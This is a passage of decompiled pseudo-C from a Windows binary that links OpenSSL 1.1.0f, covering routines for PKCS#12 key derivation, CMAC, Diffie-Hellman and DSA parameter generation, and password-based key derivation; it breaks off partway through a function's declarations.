  unsigned int v20; // ebx
  char Src[24]; // [rsp+58h] [rbp-B0h] BYREF
  char v23[64]; // [rsp+70h] [rbp-98h] BYREF

  if ( !a5 )
    return 0i64;
  v10 = sub_1400ACE40();
  v11 = sub_14003F490((__int64)v10, a4);
  v12 = (unsigned int *)v11;
  if ( !v11 )
  {
    sub_140024610(35, 120, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_crpt.c", 43);
    return 0i64;
  }
  v14 = *(int **)(v11 + 8);
  if ( v14 )
    v15 = sub_14007D9A0(v14);
  else
    v15 = 1;
  v16 = *(_QWORD *)(*(_QWORD *)v12 + 8i64);
  v17 = **(_DWORD **)v12;
  v18 = sub_140024EB0((__int64)a5);
  if ( (unsigned int)sub_1400ADCF0(a2, a3, v16, v17, 1, v15, v18, v23, a6) )
  {
    v19 = sub_140024EA0((__int64)a5);
    if ( (unsigned int)sub_1400ADCF0(a2, a3, v16, v17, 2, v15, v19, Src, a6) )
    {
      sub_1400ACE20(v12);
      v20 = sub_14001B7A0(a1, a5, 0i64, (__int64)v23, Src, a7);
      sub_140023440((__int64)v23, 64i64);
      sub_140023440((__int64)Src, 16i64);
      return v20;
    }
    else
    {
      sub_140024610(35, 120, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_crpt.c", 61);
      sub_1400ACE20(v12);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(35, 120, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs12\\p12_crpt.c", 55);
    sub_1400ACE20(v12);
    return 0i64;
  }
}
// 140062A60: using guessed type int *arg_20;
// 140062A60: using guessed type char var_98[64];

//----- (0000000140062C80) ----------------------------------------------------
__int64 __fastcall sub_140062C80(__int64 a1)
{
  __int64 result; // rax

  sub_14001B600(*(_QWORD *)a1);
  sub_140023440(a1 + 72, 32i64);
  sub_140023440(a1 + 8, 32i64);
  sub_140023440(a1 + 40, 32i64);
  result = sub_140023440(a1 + 104, 32i64);
  *(_DWORD *)(a1 + 136) = -1;
  return result;
}

//----- (0000000140062CF0) ----------------------------------------------------
__int64 __fastcall sub_140062CF0(__int64 a1, __int64 a2)
{
  size_t v5; // rbx

  if ( *(_DWORD *)(a2 + 136) == -1 || !(unsigned int)sub_14001B2F0(*(_OWORD **)a1, *(_QWORD *)a2) )
    return 0i64;
  v5 = (int)sub_140024CD0(*(_QWORD *)a2);
  memmove((void *)(a1 + 8), (const void *)(a2 + 8), v5);
  memmove((void *)(a1 + 40), (const void *)(a2 + 40), v5);
  memmove((void *)(a1 + 72), (const void *)(a2 + 72), v5);
  memmove((void *)(a1 + 104), (const void *)(a2 + 104), v5);
  *(_DWORD *)(a1 + 136) = *(_DWORD *)(a2 + 136);
  return 1i64;
}

//----- (0000000140062DA0) ----------------------------------------------------
void __fastcall sub_140062DA0(void **a1)
{
  if ( a1 )
  {
    sub_140062C80((__int64)a1);
    sub_14001B4E0(*a1);
    sub_14001D930(a1);
  }
}

//----- (0000000140062DE0) ----------------------------------------------------
_DWORD *__fastcall sub_140062DE0()
{
  int v0; // eax
  _DWORD *v1; // rbx
  void *v2; // rax

  v1 = sub_14001D8E0((unsigned int)(v0 + 112));
  if ( !v1 )
    return 0i64;
  v2 = sub_14001B520();
  *(_QWORD *)v1 = v2;
  if ( !v2 )
  {
    sub_14001D930(v1);
    return 0i64;
  }
  v1[34] = -1;
  return v1;
}
// 140062DFA: variable 'v0' is possibly undefined

//----- (0000000140062E50) ----------------------------------------------------
__int64 __fastcall sub_140062E50(__int64 a1, __int64 a2, _QWORD *a3)
{
  int v7; // eax
  __int64 v8; // rbp
  __int64 v9; // rcx
  _BYTE *v10; // rcx
  __int64 v11; // rdx
  _BYTE *v12; // rcx
  __int64 v13; // r8

  if ( *(_DWORD *)(a1 + 136) == -1 )
    return 0i64;
  v7 = sub_140024CD0(*(_QWORD *)a1);
  v8 = v7;
  *a3 = v7;
  if ( !a2 )
    return 1i64;
  v9 = *(int *)(a1 + 136);
  if ( (_DWORD)v9 == v7 )
  {
    if ( v7 > 0 )
    {
      v10 = (_BYTE *)(a1 + 8);
      v11 = v7;
      do
      {
        v10[a2 - a1 - 8] = *v10 ^ v10[96];
        ++v10;
        --v11;
      }
      while ( v11 );
    }
  }
  else
  {
    *(_BYTE *)(v9 + a1 + 104) = 0x80;
    if ( v7 - (int)v9 > 1 )
      memset((void *)(a1 + v9 + 105), 0, v7 - (int)v9 - 1);
    if ( (int)v8 > 0 )
    {
      v12 = (_BYTE *)(a1 + 40);
      v13 = v8;
      do
      {
        v12[a2 - a1 - 40] = *v12 ^ v12[64];
        ++v12;
        --v13;
      }
      while ( v13 );
    }
  }
  if ( (unsigned int)sub_140025270(*(_QWORD *)a1, a2, a2, v8) )
    return 1i64;
  sub_140023440(a2, v8);
  return 0i64;
}

//----- (0000000140062F80) ----------------------------------------------------
__int64 __fastcall sub_140062F80(_DWORD **a1, __int64 a2, __int64 a3, int *a4, __int64 a5)
{
  int v5; // esi
  size_t v9; // r8
  signed int v10; // eax
  __int64 v11; // r15
  int v12; // r8d

  v5 = a3;
  if ( a2 )
  {
    if ( !a4 )
      goto LABEL_11;
  }
  else if ( !a4 )
  {
    if ( a5 || a3 )
      return 1i64;
    if ( *((_DWORD *)a1 + 34) != -1 && (unsigned int)sub_14001C050(*a1, 0i64, 0i64, 0i64, &unk_140105F60) )
    {
      v9 = (int)sub_140024CD0((__int64)*a1);
LABEL_18:
      memset(a1 + 9, 0, v9);
      *((_DWORD *)a1 + 34) = 0;
      return 1i64;
    }
    return 0i64;
  }
  if ( !(unsigned int)sub_14001C050(*a1, a4, a5, 0i64, 0i64) )
    return 0i64;
LABEL_11:
  if ( a2 )
  {
    if ( sub_140021BD0((__int64)*a1) )
    {
      if ( (unsigned int)sub_14001B690(*a1, v5) )
      {
        if ( (unsigned int)sub_14001C050(*a1, 0i64, 0i64, a2, &unk_140105F60) )
        {
          v10 = sub_140024CD0((__int64)*a1);
          v11 = v10;
          if ( (unsigned int)sub_140025270((__int64)*a1, (__int64)(a1 + 9), (__int64)&unk_140105F60, v10) )
          {
            sub_140063240((__int64)(a1 + 1), (char *)a1 + 72, v11);
            sub_140063240((__int64)(a1 + 5), (char *)a1 + 8, v12);
            sub_140023440((__int64)(a1 + 9), v11);
            if ( (unsigned int)sub_14001C050(*a1, 0i64, 0i64, 0i64, &unk_140105F60) )
            {
              v9 = v11;
              goto LABEL_18;
            }
          }
        }
      }
    }
    return 0i64;
  }
  return 1i64;
}
// 1400630B7: variable 'v12' is possibly undefined

//----- (0000000140063120) ----------------------------------------------------
__int64 __fastcall sub_140063120(__int64 a1, char *a2, size_t a3)
{
  size_t v3; // rbx
  __int64 result; // rax
  size_t v7; // rdi
  __int64 v8; // rax
  size_t v9; // r15

  v3 = a3;
  if ( *(_DWORD *)(a1 + 136) == -1 )
    return 0i64;
  if ( !a3 )
    return 1i64;
  v7 = (int)sub_140024CD0(*(_QWORD *)a1);
  v8 = *(int *)(a1 + 136);
  if ( (int)v8 <= 0 )
    goto LABEL_11;
  v9 = v7 - v8;
  if ( v3 < v7 - v8 )
    v9 = v3;
  memmove((void *)(v8 + a1 + 104), a2, v9);
  *(_DWORD *)(a1 + 136) += v9;
  v3 -= v9;
  if ( !v3 )
    return 1i64;
  a2 += v9;
  result = sub_140025270(*(_QWORD *)a1, a1 + 72, a1 + 104, v7);
  if ( (_DWORD)result )
  {
LABEL_11:
    if ( v3 <= v7 )
    {
LABEL_14:
      memmove((void *)(a1 + 104), a2, v3);
      result = 1i64;
      *(_DWORD *)(a1 + 136) = v3;
    }
    else
    {
      while ( (unsigned int)sub_140025270(*(_QWORD *)a1, a1 + 72, (__int64)a2, v7) )
      {
        v3 -= v7;
        a2 += v7;
        if ( v3 <= v7 )
          goto LABEL_14;
      }
      return 0i64;
    }
  }
  return result;
}

//----- (0000000140063240) ----------------------------------------------------
__int64 __fastcall sub_140063240(__int64 a1, char *a2, int a3)
{
  unsigned __int8 v3; // r9
  __int64 v4; // r11
  char v5; // bl
  int v6; // esi
  __int64 v8; // r10
  char *v9; // rdx
  unsigned __int8 v10; // cl
  char v11; // al
  char v12; // cl
  __int64 result; // rax

  v3 = *a2;
  v4 = a3 - 1;
  v5 = (unsigned __int8)*a2 >> 7;
  v6 = 0;
  if ( a3 - 1 > 0 )
  {
    v8 = a1;
    v9 = &a2[-a1];
    v6 = a3 - 1;
    do
    {
      v10 = v9[++v8];
      v11 = (2 * v3) | (v10 >> 7);
      v3 = v10;
      *(_BYTE *)(v8 - 1) = v11;
      --v4;
    }
    while ( v4 );
  }
  v12 = 27;
  if ( a3 == 16 )
    v12 = -121;
  result = v6;
  *(_BYTE *)(v6 + a1) = (2 * v3) ^ -v5 & v12;
  return result;
}

//----- (00000001400632E0) ----------------------------------------------------
__int64 __fastcall sub_1400632E0(__int64 a1, int a2, int a3, __int64 a4)
{
  __int64 (*v4)(void); // r10

  v4 = *(__int64 (**)(void))(*(_QWORD *)(a1 + 120) + 64i64);
  if ( v4 )
    return v4();
  else
    return sub_140063310(a1, a2, a3, a4);
}

//----- (0000000140063310) ----------------------------------------------------
__int64 __fastcall sub_140063310(__int64 a1, int a2, int a3, __int64 a4)
{
  int *v7; // rax
  int *v8; // rbx
  _QWORD *v9; // r12
  _QWORD *v10; // rax
  __int64 v11; // r15
  _DWORD *v12; // rax
  _DWORD *v13; // rax
  unsigned int v14; // edi
  int v15; // esi

  v7 = (int *)sub_140027CD0();
  v8 = v7;
  if ( !v7 )
    goto LABEL_24;
  sub_140027D40(v7);
  v9 = sub_140027C40(v8);
  v10 = sub_140027C40(v8);
  v11 = (__int64)v10;
  if ( !v9 )
    goto LABEL_24;
  if ( !v10 )
    goto LABEL_24;
  if ( !*(_QWORD *)(a1 + 8) )
  {
    v12 = sub_140027200();
    *(_QWORD *)(a1 + 8) = v12;
    if ( !v12 )
      goto LABEL_24;
  }
  if ( !*(_QWORD *)(a1 + 16) )
  {
    v13 = sub_140027200();
    *(_QWORD *)(a1 + 16) = v13;
    if ( !v13 )
      goto LABEL_24;
  }
  if ( a3 <= 1 )
  {
    sub_140024610(5, 106, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_gen.c", 81);
    goto LABEL_24;
  }
  v14 = 1;
  if ( a3 == 2 )
  {
    if ( !(unsigned int)sub_140027560((__int64)v9, 24i64) || !(unsigned int)sub_140027560(v11, 11i64) )
      goto LABEL_24;
    v15 = 2;
  }
  else if ( a3 == 5 )
  {
    if ( !(unsigned int)sub_140027560((__int64)v9, 10i64) || !(unsigned int)sub_140027560(v11, 3i64) )
      goto LABEL_24;
    v15 = 5;
  }
  else
  {
    if ( !(unsigned int)sub_140027560((__int64)v9, 2i64) || !(unsigned int)sub_140027560(v11, 1i64) )
      goto LABEL_24;
    v15 = a3;
  }
  if ( !(unsigned int)sub_1400ADE40(*(__int64 ***)(a1 + 8), a2, 1, (__int64)v9, v11, a4)
    || !(unsigned int)sub_1400ADDE0(a4, 3u, 0)
    || !(unsigned int)sub_140027560(*(_QWORD *)(a1 + 16), v15) )
  {
LABEL_24:
    sub_140024610(5, 106, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_gen.c", 121);
    v14 = 0;
  }
  if ( v8 )
  {
    sub_140027B60((__int64)v8);
    sub_140027BE0((__int64)v8);
  }
  return v14;
}

//----- (0000000140063510) ----------------------------------------------------
_QWORD *sub_140063510()
{
  _QWORD *v0; // rbx
  _DWORD *v1; // rax
  bool v2; // zf

  v0 = (_QWORD *)sub_14002D430();
  if ( v0 )
  {
    v0[1] = sub_140026F70((__int64)&off_14011E140);
    v0[2] = sub_140026F70((__int64)&off_14011E158);
    v1 = sub_140026F70((__int64)&off_14011E170);
    v2 = v0[1] == 0i64;
    v0[8] = v1;
    if ( !v2 && v1 && v0[2] )
      return v0;
    sub_14002D310((__int64)v0);
  }
  return 0i64;
}
// 14011E140: using guessed type void *off_14011E140;
// 14011E158: using guessed type void *off_14011E158;
// 14011E170: using guessed type void *off_14011E170;

//----- (0000000140063590) ----------------------------------------------------
_QWORD *sub_140063590()
{
  _QWORD *v0; // rbx
  _DWORD *v1; // rax
  bool v2; // zf

  v0 = (_QWORD *)sub_14002D430();
  if ( v0 )
  {
    v0[1] = sub_140026F70((__int64)&off_14011E188);
    v0[2] = sub_140026F70((__int64)&off_14011E1A0);
    v1 = sub_140026F70((__int64)&off_14011E1B8);
    v2 = v0[1] == 0i64;
    v0[8] = v1;
    if ( !v2 && v1 && v0[2] )
      return v0;
    sub_14002D310((__int64)v0);
  }
  return 0i64;
}
// 14011E188: using guessed type void *off_14011E188;
// 14011E1A0: using guessed type void *off_14011E1A0;
// 14011E1B8: using guessed type void *off_14011E1B8;

//----- (0000000140063610) ----------------------------------------------------
_QWORD *sub_140063610()
{
  _QWORD *v0; // rbx
  _DWORD *v1; // rax
  bool v2; // zf

  v0 = (_QWORD *)sub_14002D430();
  if ( v0 )
  {
    v0[1] = sub_140026F70((__int64)&off_14011E1D0);
    v0[2] = sub_140026F70((__int64)&off_14011E1E8);
    v1 = sub_140026F70((__int64)&off_14011E200);
    v2 = v0[1] == 0i64;
    v0[8] = v1;
    if ( !v2 && v1 && v0[2] )
      return v0;
    sub_14002D310((__int64)v0);
  }
  return 0i64;
}
// 14011E1D0: using guessed type void *off_14011E1D0;
// 14011E1E8: using guessed type void *off_14011E1E8;
// 14011E200: using guessed type void *off_14011E200;

//----- (0000000140063690) ----------------------------------------------------
__int64 *__fastcall sub_140063690(
        char *a1,
        size_t a2,
        char *a3,
        char *a4,
        __int64 a5,
        __int64 a6,
        unsigned __int64 a7,
        int *a8)
{
  unsigned int v8; // r13d
  __int64 *result; // rax
  __int64 *v12; // rbx
  unsigned __int64 v13; // rsi
  int v14; // ebp
  char *v15; // r15
  unsigned __int8 *v16; // [rsp+38h] [rbp-C0h] BYREF
  char *v17[4]; // [rsp+40h] [rbp-B8h] BYREF
  char Src[64]; // [rsp+60h] [rbp-98h] BYREF

  v8 = 0;
  v17[1] = a4;
  v17[2] = a3;
  v16 = 0i64;
  if ( (unsigned __int64)a4 > 0x40000000 )
    return 0i64;
  result = (__int64 *)sub_14006DFD0();
  v12 = result;
  if ( result )
  {
    v13 = (int)sub_1400253D0((__int64)a8);
    if ( (unsigned int)sub_140063890(&v16, v17, a5, a2, a6, a7) )
    {
      v14 = 1;
      if ( (unsigned int)sub_14006DB20((__int64)v12, a8, 0i64) )
      {
        v15 = v17[0];
        do
        {
          if ( !(unsigned int)sub_14006DD90((__int64)v12) )
            break;
          v15[3] = v14;
          v15[2] = BYTE1(v14);
          v15[1] = BYTE2(v14);
          *v15 = HIBYTE(v14);
          if ( !(unsigned int)sub_14006DD90((__int64)v12) )
            break;
          if ( a2 < v13 )
          {
            if ( !(unsigned int)sub_14006DA40(v12, (__int64)Src, 0i64) )
              break;
            memmove(a1, Src, a2);
            sub_140023440((__int64)Src, v13);
LABEL_16:
            v8 = 1;
            break;
          }
          if ( !(unsigned int)sub_14006DA40(v12, (__int64)a1, 0i64) )
            break;
          a2 -= v13;
          if ( !a2 )
            goto LABEL_16;
          a1 += v13;
          ++v14;
        }
        while ( (unsigned int)sub_14006DB20((__int64)v12, a8, 0i64) );
      }
    }
    sub_14001D930(v16);
    sub_14006DF90(v12);
    return (__int64 *)v8;
  }
  return result;
}

//----- (0000000140063890) ----------------------------------------------------
__int64 __fastcall sub_140063890(
        unsigned __int8 **a1,
        char **a2,
        __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        unsigned __int64 a6)
{
  int *v8; // r8
  int v9; // eax
  unsigned int v10; // edi
  unsigned __int8 *v11; // rbx
  int v12; // esi
  int v13; // ebx
  int v14; // r14d
  int v15; // ebx
  char *v16; // rbx
  int v18; // [rsp+30h] [rbp-69h] BYREF
  int v19; // [rsp+34h] [rbp-65h] BYREF
  int v20; // [rsp+38h] [rbp-61h] BYREF
  int v21; // [rsp+3Ch] [rbp-5Dh] BYREF
  int v22; // [rsp+40h] [rbp-59h] BYREF
  int v23; // [rsp+44h] [rbp-55h] BYREF
  int v24; // [rsp+48h] [rbp-51h] BYREF
  int v25; // [rsp+4Ch] [rbp-4Dh] BYREF
  char *v26; // [rsp+50h] [rbp-49h] BYREF
  unsigned __int8 *v27; // [rsp+58h] [rbp-41h] BYREF
  unsigned __int8 *v28; // [rsp+60h] [rbp-39h] BYREF
  char *v29; // [rsp+68h] [rbp-31h] BYREF
  int v30; // [rsp+70h] [rbp-29h] BYREF
  int v31; // [rsp+74h] [rbp-25h] BYREF
  int v32; // [rsp+78h] [rbp-21h] BYREF
  int v33[2]; // [rsp+80h] [rbp-19h] BYREF
  void *v34; // [rsp+88h] [rbp-11h]
  int v35; // [rsp+90h] [rbp-9h]
  int v36[2]; // [rsp+98h] [rbp-1h] BYREF
  __int64 v37; // [rsp+A0h] [rbp+7h]
  int v38; // [rsp+A8h] [rbp+Fh]
  int v39; // [rsp+B0h] [rbp+17h] BYREF
  int *v40; // [rsp+B8h] [rbp+1Fh]
  __int64 v41[4]; // [rsp+C0h] [rbp+27h] BYREF

  if ( a6 > 0x40000000 || a4 > 0x40000000 )
    return 0i64;
  v41[0] = a3;
  v8 = 0i64;
  v41[1] = (__int64)&v39;
  v34 = &unk_14013CFA8;
  v33[0] = 4;
  v35 = 0;
  v33[1] = 4;
  v39 = 4;
  v40 = v33;
  if ( a5 )
  {
    v38 = 0;
    v8 = v36;
    v36[1] = 4;
    v37 = a5;
    v36[0] = a6;
  }
  v9 = sub_1400809F0(a1, (__int64)v41, (__int64)v8, a4);
  v10 = v9;
  if ( v9 <= 0 )
    return 0i64;
  v11 = *a1;
  v27 = v11;
  if ( (sub_140047780(&v27, &v30, (int *)&a6, &v18, v9) & 0x80u) != 0i64 || (_DWORD)a6 != 16 || v18 )
    return 0i64;
  v12 = (int)v27;
  v28 = v27;
  v13 = v10 + (_DWORD)v11 - (_DWORD)v27;
  if ( (sub_140047780(&v28, &v31, &v19, &v20, v13) & 0x80u) != 0i64 || v19 != 16 || v20 )
    return 0i64;
  v14 = (int)v28;
  v26 = (char *)v28;
  v15 = v12 - (_DWORD)v28 + v13;
  if ( (sub_140047780(&v26, &v23, &v21, &v22, v15) & 0x80u) != 0i64 )
    return 0i64;
  if ( v21 != 6 )
    return 0i64;
  if ( v22 )
    return 0i64;
  v26 += v23;
  v29 = v26;
  if ( (sub_140047780(&v29, &v32, &v24, &v25, v14 - (int)v26 + v15) & 0x80u) != 0i64 )
    return 0i64;
  if ( v24 != 4 )
    return 0i64;
  if ( v25 )
    return 0i64;
  v16 = v29;
  if ( (unsigned int)sub_140023460(v29, (__int64)&unk_14013CFA8, 4i64) )
    return 0i64;
  *a2 = v16;
  return v10;
}

//----- (0000000140063AD0) ----------------------------------------------------
__int64 __fastcall sub_140063AD0(
        _DWORD **a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        int *a4,
        void *Src,
        unsigned __int64 a6,
        void *a7,
        unsigned int *a8,
        int *a9,
        __int64 a10)
{
  unsigned int v10; // r13d
  __int64 v11; // r14
  int *v12; // rdi
  unsigned __int64 v13; // r12
  int *v14; // rsi
  size_t v16; // r8
  __int64 v18; // r15
  int *v19; // rax
  int *v20; // r13
  __int64 *v21; // rdi
  __int64 *v22; // rax
  int v23; // ebx
  __int64 i; // rax
  bool v26; // zf
  __int64 v27; // rcx
  int v28; // eax
  __int64 v29; // rbx
  unsigned int v30; // r13d
  unsigned __int64 v31; // r14
  int v32; // ebx
  __int64 j; // rax
  void **v34; // rax
  int v35; // eax
  void **v36; // rax
  void **v37; // rax
  _DWORD *v38; // rax
  int v39; // [rsp+30h] [rbp-D0h]
  _DWORD *v40; // [rsp+38h] [rbp-C8h]
  unsigned int v41; // [rsp+40h] [rbp-C0h]
  int *v42; // [rsp+48h] [rbp-B8h]
  __int64 **v43; // [rsp+50h] [rbp-B0h]
  _QWORD *v44; // [rsp+58h] [rbp-A8h]
  __int64 **v45; // [rsp+68h] [rbp-98h]
  _QWORD *v46; // [rsp+70h] [rbp-90h]
  void *v47; // [rsp+78h] [rbp-88h]
  unsigned __int64 v48; // [rsp+80h] [rbp-80h]
  _QWORD *v49; // [rsp+88h] [rbp-78h]
  int *v50; // [rsp+90h] [rbp-70h]
  __int64 *v51; // [rsp+98h] [rbp-68h]
  int v52; // [rsp+A0h] [rbp-60h]
  _QWORD *v53; // [rsp+A8h] [rbp-58h]
  void *v55; // [rsp+C8h] [rbp-38h]
  __int128 v56[2]; // [rsp+D0h] [rbp-30h] BYREF
  char v57[32]; // [rsp+F0h] [rbp-10h] BYREF
  char v58[32]; // [rsp+110h] [rbp+10h] BYREF
  __int128 v59[2]; // [rsp+130h] [rbp+30h] BYREF

  v10 = 0;
  v11 = a10;
  v12 = 0i64;
  v13 = a3 >> 3;
  v14 = a4;
  v55 = a7;
  v50 = a4;
  v47 = Src;
  v39 = 0;
  v41 = 0;
  v52 = 2;
  if ( (((unsigned int)(a3 >> 3) - 20) & 0xFFFFFFF3) != 0 || (_DWORD)v13 == 24 )
    return 0i64;
  if ( !a4 )
  {
    v14 = (int *)sub_14005BAC0();
    v50 = v14;
  }
  if ( a2 < 0x200 )
    a2 = 512i64;
  v48 = (a2 + 63) & 0xFFFFFFFFFFFFFFC0ui64;
  if ( Src )
  {
    v16 = a6;
    if ( a6 < (int)v13 )
    {
      sub_140024610(10, 125, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_gen.c", 78);
      return 0i64;
    }
    if ( a6 > (int)v13 )
      v16 = (int)v13;
    memmove(v58, Src, v16);
  }
  v40 = sub_14003C400();
  v18 = (__int64)v40;
  if ( v40 )
  {
    v19 = (int *)sub_140027CD0();
    v42 = v19;
    v12 = v19;
    if ( v19 )
    {
      sub_140027D40(v19);
      v20 = v42;
      v21 = sub_140027C40(v12);
      v46 = sub_140027C40(v42);
      v49 = sub_140027C40(v42);
      v43 = (__int64 **)sub_140027C40(v42);
      v44 = sub_140027C40(v42);
      v53 = sub_140027C40(v42);
      v45 = (__int64 **)sub_140027C40(v42);
      v51 = sub_140027C40(v42);
      if ( v51 )
      {
        v22 = (__int64 *)sub_140027650();
        if ( (unsigned int)sub_140046E40((__int64)v51, v22, (int)v48 - 1) )
        {
LABEL_18:
          do
          {
            v23 = v47 == 0i64;
            if ( !(unsigned int)sub_1400ADDE0(v11, 0, v41++) )
              break;
            if ( v47 )
            {
              v47 = 0i64;
            }
            else if ( (int)sub_140025460((__int64)v58, v13) <= 0 )
            {
              break;
            }
            memmove(v57, v58, (int)v13);
            memmove(v59, v58, (int)v13);
            for ( i = (int)v13 - 1i64; i >= 0; --i )
            {
              v26 = v57[i]++ == -1;
              if ( !v26 )
                break;
            }
            if ( !(unsigned int)sub_14006D970((__int64)v58, (int)v13, (__int64)v56, 0i64, v14, 0i64)
              || !(unsigned int)sub_14006D970((__int64)v57, (int)v13, (__int64)v59, 0i64, v14, 0i64) )
            {
              break;
            }
            v27 = 0i64;
            if ( (int)v13 >= 32 )
            {
              do
              {
                *(__int128 *)((char *)v56 + v27) = (__int128)_mm_xor_si128(
                                                               _mm_loadu_si128((const __m128i *)((char *)v59 + v27)),
                                                               _mm_loadu_si128((const __m128i *)((char *)v56 + v27)));
                *(__int128 *)((char *)&v56[1] + v27) = (__int128)_mm_xor_si128(
                                                                   _mm_loadu_si128((const __m128i *)((char *)&v59[1] + v27)),
                                                                   _mm_loadu_si128((const __m128i *)((char *)&v56[1] + v27)));
                v27 += 32i64;
              }
              while ( v27 < (int)(v13 - (v13 & 0x1F)) );
            }
            for ( ; v27 < (int)v13; ++v27 )
              *((_BYTE *)v56 + v27) ^= *((_BYTE *)v59 + v27);
            LOBYTE(v56[0]) |= 0x80u;
            *((_BYTE *)&v55 + (int)v13 + 7) |= 1u;
            if ( !sub_140026840(v56, v13, (__int64)v43) )
              break;
            v28 = sub_1400AE180(v43, 50, v20, v23, v11);
            if ( v28 > 0 )
            {
              if ( (unsigned int)sub_1400ADDE0(v11, 2u, 0) && (unsigned int)sub_1400ADDE0(v11, 3u, 0) )
              {
                v29 = (__int64)v49;
                v30 = 0;
                v31 = (v48 - 1) / 0xA0;
                while ( !v30 || (unsigned int)sub_1400ADDE0(a10, 0, v30) )
                {
                  sub_140027560(v29, 0i64);
                  v32 = 0;
                  if ( (v31 & 0x80000000) == 0i64 )
                  {
                    do
                    {
                      for ( j = (int)v13 - 1i64; j >= 0; --j )
                      {
                        v26 = v57[j]++ == -1;
                        if ( !v26 )
                          break;
                      }
                      if ( !(unsigned int)sub_14006D970((__int64)v57, (int)v13, (__int64)v56, 0i64, v50, 0i64)
                        || !sub_140026840(v56, v13, (__int64)v21)
                        || !(unsigned int)sub_140046E40((__int64)v21, v21, v32 * 8 * (int)v13)
                        || !(unsigned int)sub_140041A10((__int64)v49, (__int64)v49, (__int64)v21) )
                      {
                        goto LABEL_21;
                      }
                    }
                    while ( ++v32 <= (int)v31 );
                  }
                  v29 = (__int64)v49;
                  if ( !(unsigned int)sub_140027170((__int64)v49, (int)v48 - 1) )
                    goto LABEL_21;
                  if ( !sub_140026E90((__int64)v44, (__int64)v49) )
                    goto LABEL_21;
                  if ( !(unsigned int)sub_140041A10((__int64)v44, (__int64)v44, (__int64)v51) )
                    goto LABEL_21;
                  if ( !(unsigned int)sub_140046FD0((__int64)v21, (__int64)v43) )
                    goto LABEL_21;
                  if ( !(unsigned int)sub_140041D70(0i64, (__int64)v53, (__int64)v44, (__int64)v21, v42) )
                    goto LABEL_21;
                  v34 = sub_140027650();
                  if ( !(unsigned int)sub_140041AC0((__int64)v21, (__int64)v53, (__int64)v34)
                    || !(unsigned int)sub_140041AC0((__int64)v45, (__int64)v44, (__int64)v21) )
                  {
                    goto LABEL_21;
                  }
                  if ( (int)sub_140026AB0((__int64)v45, v51) >= 0 )
                  {
                    v35 = sub_1400AE180(v45, 50, v42, 1, a10);
                    if ( v35 > 0 )
                    {
                      if ( (unsigned int)sub_1400ADDE0(a10, 2u, 1u) )
                      {
                        v36 = sub_140027650();
                        if ( (unsigned int)sub_140041AC0((__int64)v51, (__int64)v45, (__int64)v36) )
                        {
                          if ( (unsigned int)sub_140041D70(v21, 0i64, (__int64)v51, (__int64)v43, v42)
                            && (unsigned int)sub_140027560((__int64)v51, 2i64)
                            && (unsigned int)sub_14003C480((__int64)v40, v45, v42)
                            && (unsigned int)sub_14007BDF0(
                                               (__int64)v46,
                                               (__int64)v51,
                                               (__int64)v21,
                                               (unsigned __int64)v45,
                                               v42,
                                               (__int64)v40) )
                          {
                            while ( sub_140027110((__int64)v46) )
                            {
                              v37 = sub_140027650();
                              if ( (unsigned int)sub_140041A10((__int64)v51, (__int64)v51, (__int64)v37) )
                              {
                                ++v52;
                                if ( (unsigned int)sub_14007BDF0(
                                                     (__int64)v46,
                                                     (__int64)v51,
                                                     (__int64)v21,
                                                     (unsigned __int64)v45,
                                                     v42,
                                                     (__int64)v40) )
                                  continue;
                              }
                              goto LABEL_21;
                            }
                            if ( (unsigned int)sub_1400ADDE0(a10, 3u, 1u) )
                            {
                              v39 = 1;
                              sub_140026FF0(a1[1]);
                              sub_140026FF0(a1[2]);
                              sub_140026FF0(a1[3]);
                              a1[1] = sub_140026F70((__int64)v45);
                              a1[2] = sub_140026F70((__int64)v43);
                              v38 = sub_140026F70((__int64)v46);
                              v26 = a1[1] == 0i64;
                              a1[3] = v38;
                              if ( v26 || !a1[2] || !v38 )
                              {
                                v18 = (__int64)v40;
                                v10 = 0;
                                goto LABEL_23;
                              }
                              if ( a8 )
                                *a8 = v30;
                              if ( a9 )
                                *a9 = v52;
                              if ( v55 )
                                memmove(v55, v58, (int)v13);
                            }
                          }
                        }
                      }
                      goto LABEL_21;
                    }
                    if ( v35 )
                      goto LABEL_21;
                  }
                  if ( (int)++v30 >= 4096 )
                  {
                    v14 = v50;
                    v11 = a10;
                    v20 = v42;
                    goto LABEL_18;
                  }
                }
              }
              break;
            }
          }
          while ( !v28 );
        }
LABEL_21:
        v18 = (__int64)v40;
      }
      v10 = v39;
LABEL_23:
      v12 = v42;
      sub_140027B60((__int64)v42);
    }
  }
  sub_140027BE0((__int64)v12);
  sub_14003C3A0(v18);
  return v10;
}
// 140063DE5: conditional instruction was optimized away because r12d.4>=20
// 140063DDF: mask 0x8000001F is shortened because r12d.4 <= 0x7FFFFFFF
// 140063AD0: using guessed type char var_B0[32];

//----- (00000001400642D0) ----------------------------------------------------
__int64 __fastcall sub_1400642D0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        int *a4,
        const void *a5,
        size_t Size,
        int a7,
        void *a8,
        unsigned int *a9,
        int *a10,
        __int64 a11)
{
  size_t v11; // r14
  __int64 v12; // rdi
  char *v14; // r12
  unsigned int v15; // r13d
  unsigned __int64 v16; // r15
  __int64 v17; // rsi
  __int64 *v18; // rbp
  int *v19; // rax
  size_t v20; // rdi
  void *v21; // rax
  const void *v22; // rbx
  __int64 *v23; // rbp
  _QWORD *v24; // rsi
  __int64 v25; // rbx
  void **v26; // rax
  __int64 *v27; // rax
  int v28; // eax
  char *v29; // rbx
  bool v30; // cc
  int v31; // eax
  unsigned int v32; // r14d
  int v33; // r15d
  unsigned __int64 v34; // r14
  int v35; // edi
  __int64 v36; // rcx
  int v37; // ebx
  __int64 v38; // rsi
  char *v39; // rax
  bool v40; // zf
  void **v41; // rax
  int v42; // eax
  unsigned int v43; // ecx
  int v44; // eax
  void **v45; // rax
  __int64 **v46; // rcx
  __int64 **v47; // rcx
  _DWORD *v48; // rax
  __int64 *v50; // [rsp+38h] [rbp-160h]
